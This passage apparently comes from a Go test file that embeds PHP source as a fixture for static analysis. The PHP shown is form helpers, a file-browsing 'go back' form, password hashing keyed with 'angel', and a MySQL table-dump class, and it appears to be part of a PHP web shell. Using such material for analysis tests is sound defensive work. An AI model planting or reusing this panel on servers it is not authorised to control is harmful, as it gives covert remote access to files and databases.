$arg['title'] : '';\n    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';\n    p(\"$arg[title] <select class=\\\"input\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" $onchange>\");\n    if (is_array($arg['option'])) {\n        foreach ($arg['option'] as $key=>$value) {\n            if ($arg['selected']==$key) {\n                p(\"<option value=\\\"$key\\\" selected>$value</option>\");\n            } else {\n                p(\"<option value=\\\"$key\\\">$value</option>\");\n            }\n        }\n    }\n    p(\"</select>\");\n}\nfunction formhead($arg = array()) {\n    !isset($arg['method']) && $arg['method'] = 'post';\n    !isset($arg['name']) && $arg['name'] = 'form1';\n    $arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';\n    $arg['onsubmit'] = isset($arg['onsubmit']) ? \"onsubmit=\\\"$arg[onsubmit]\\\"\" : '';\n    p(\"<form name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" action=\\\"\".SELF.\"\\\" method=\\\"$arg[method]\\\" $arg[onsubmit] $arg[extra]>\");\n    if (isset($arg['title'])) {\n        p('<h2>'.$arg['title'].' &raquo;</h2>');\n    }\n}\n\nfunction maketext($arg = array()){\n    $arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';\n    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';\n    p(\"<p>$arg[title]<textarea class=\\\"area\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" cols=\\\"100\\\" rows=\\\"25\\\">$arg[value]</textarea></p>\");\n}\n\nfunction formfooter($name = ''){\n    !$name && $name = 'submit';\n    p('<p><input class=\"bt\" name=\"'.$name.'\" id=\"'.$name.'\" type=\"submit\" value=\"Submit\"></p>');\n    p('</form>');\n}\n\nfunction goback(){\n    global $cwd, $charset;\n    p('<form action=\"'.SELF.'\" method=\"post\"><input type=\"hidden\" name=\"act\" value=\"file\" /><input type=\"hidden\" name=\"cwd\" value=\"'.$cwd.'\" /><input type=\"hidden\" name=\"charset\" value=\"'.$charset.'\" /><p><input class=\"bt\" type=\"submit\" value=\"Go back...\"></p></form>');\n}\n\nfunction formfoot(){\n    p('</form>');\n}\n\nfunction encode_pass($pass) {\n    $k = 'angel';\n    $pass = md5($k.$pass);\n    $pass = md5($pass.$k);\n    $pass = md5($k.$pass.$k);\n    return $pass;\n}\n\nfunction pr($a) {\n    p('<div style=\"text-align: left;border:1px solid #ddd;\"><pre>'.print_r($a).'</pre></div>');\n}\n\nclass DB_MySQL  {\n\n    var $querycount = 0;\n    var $link;\n    var $charsetdb = array();\n    var $charset = '';\n\n    function connect($dbhost, $dbuser, $dbpass, $dbname='') {\n        @ini_set('mysql.connect_timeout', 5);\n        if(!$this->link = @mysql_connect($dbhost, $dbuser, $dbpass, 1)) {\n            $this->halt('Can not connect to MySQL server');\n        }\n        if($this->version() > '4.1') {\n            $this->setcharset($this->charset);\n        }\n        $dbname && mysql_select_db($dbname, $this->link);\n    }\n    function setcharset($charset) {\n        if ($charset && $this->charsetdb[$charset]) {\n            if(function_exists('mysql_set_charset')) {\n                mysql_set_charset($this->charsetdb[$charset], $this->link);\n            } else {\n                $this->query(\"SET character_set_connection='\".$this->charsetdb[$charset].\"', character_set_results='\".$this->charsetdb[$charset].\"', character_set_client=binary\");\n            }\n        }\n    }\n    function select_db($dbname) {\n        return mysql_select_db($dbname, $this->link);\n    }\n    function geterrdesc() {\n        return (($this->link) ? mysql_error($this->link) : mysql_error());\n    }\n    function geterrno() {\n        return intval(($this->link) ? mysql_errno($this->link) : mysql_errno());\n    }\n    function fetch($query, $result_type = MYSQL_ASSOC) { //MYSQL_NUM\n        return mysql_fetch_array($query, $result_type);\n    }\n    function query($sql) {\n        //echo '<p style=\"color:#f00;\">'.$sql.'</p>';\n        if(!($query = mysql_query($sql, $this->link))) {\n            $this->halt('MySQL Query Error', $sql);\n        }\n        $this->querycount++;\n        return $query;\n    }\n    function query_res($sql) {\n        $res = '';\n        if(!$res = mysql_query($sql, $this->link)) {\n            $res = 0;\n        } else if(is_resource($res)) {\n            $res = 1;\n        } else {\n            $res = 2;\n        }\n        $this->querycount++;\n        return $res;\n    }\n    function num_rows($query) {\n        $query = mysql_num_rows($query);\n        return $query;\n    }\n    function num_fields($query) {\n        $query = mysql_num_fields($query);\n        return $query;\n    }\n    function affected_rows() {\n        return mysql_affected_rows($this->link);\n    }\n    function result($query, $row) {\n        $query = mysql_result($query, $row);\n        return $query;\n    }\n    function free_result($query) {\n        $query = mysql_free_result($query);\n        return $query;\n    }\n    function version() {\n        return mysql_get_server_info($this->link);\n    }\n    function close() {\n        return mysql_close($this->link);\n    }\n    function halt($msg =''){\n        echo \"<h2>\".htmlspecialchars($msg).\"</h2>\\n\";\n        echo \"<p class=\\\"b\\\">Mysql error description: \".htmlspecialchars($this->geterrdesc()).\"</p>\\n\";\n        echo \"<p class=\\\"b\\\">Mysql error number: \".$this->geterrno().\"</p>\\n\";\n        exit;\n    }\n    function get_fields_meta($result) {\n        $fields = array();\n        $num_fields = $this->num_fields($result);\n        for ($i = 0; $i < $num_fields; $i++) {\n            $field = mysql_fetch_field($result, $i);\n            $fields[] = $field;\n        }\n        return $fields;\n    }\n    function sqlAddSlashes($s = ''){\n        $s = str_replace('\\\\', '\\\\\\\\', $s);\n        $s = str_replace('\\'', '\\'\\'', $s);\n        return $s;\n    }\n    // 备份数据库\n    function sqldump($table, $fp=0) {\n        $crlf = (IS_WIN ? \"\\r\\n\" : \"\\n\");\n        $search = array(\"\\x00\", \"\\x0a\", \"\\x0d\", \"\\x1a\"); //\\x08\\\\x09, not required\n        $replace = array('\\0', '\\n', '\\r', '\\Z');\n\n        if (isset($this->charset) && isset($this->charsetdb[$this->charset])) {\n            $set_names = $this->charsetdb[$this->charset];\n        } else {\n            $set_names = $this->charsetdb['utf-8'];\n        }\n        $tabledump = 'SET SQL_MODE=\"NO_AUTO_VALUE_ON_ZERO\";'.$crlf.$crlf;\n        $tabledump .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;'.$crlf\n            . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;'.$crlf\n            . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;'.$crlf\n            . '/*!40101 SET NAMES ' . $set_names . ' */;'.$crlf.$crlf;\n\n        $tabledump .= \"DROP TABLE IF EXISTS `$table`;\".$crlf;\n        $res = $this->query(\"SHOW CREATE TABLE $table\");\n        $create = $this->fetch($res, MYSQL_NUM);\n        $tabledump .= $create[1].';'.$crlf.$crlf;\n        if (strpos($tabledump, \"(\\r\\n \")) {\n            $tabledump = str_replace(\"\\r\\n\", $crlf, $tabledump);\n        } elseif (strpos($tabledump, \"(\\n \")) {\n            $tabledump = str_replace(\"\\n\", $crlf, $tabledump);\n        } elseif (strpos($tabledump, \"(\\r \")) {\n            $tabledump = str_replace(\"\\r\", $crlf, $tabledump);\n        }\n        unset($create);\n\n        if ($fp) {\n            fwrite($fp,$tabledump);\n        } else {\n            echo $tabledump;\n        }\n        $tabledump = '';\n        $rows = $this->query(\"SELECT * FROM $table\");\n        $fields_cnt = $this->num_fields($rows);\n        $fields_meta = $this->get_fields_meta($rows);\n\n        while ($row = $this->fetch($rows, MYSQL_NUM)) {\n            for ($j = 0; $j < $fields_cnt; $j++) {\n                if (!isset($row[$j]) || is_null($row[$j])) {\n                    $values[] = 'NULL';\n                } elseif ($fields_meta[$j]->numeric && $fields_meta[$j]->type != 'timestamp' && !$fields_meta[$j]->blob) {\n                    $values[] = $row[$j];\n                } elseif ($fields_meta[$j]->blob) {\n                    if (empty($row[$j]) && $row[$j] != '0') {\n                        $values[] = '\\'\\'';\n                    } else {\n                        $values[] = '0x'.bin2hex($row[$j]);\n                    }\n                } else {\n                    $values[] = '\\''.str_replace($search, $replace, $this->sqlAddSlashes($row[$j])).'\\'';\n                }\n            }\n            $tabledump = 'INSERT INTO `'.$table.'` VALUES('.implode(', ', $values).');'.$crlf;\n            unset($values);\n            if ($fp) {\n                fwrite($fp,$tabledump);\n            } else {\n                echo $tabledump;\n            }\n        }\n        $this->free_result($rows);\n    }\n}\n?>"
//	test.MockSSA(t, code)
//}
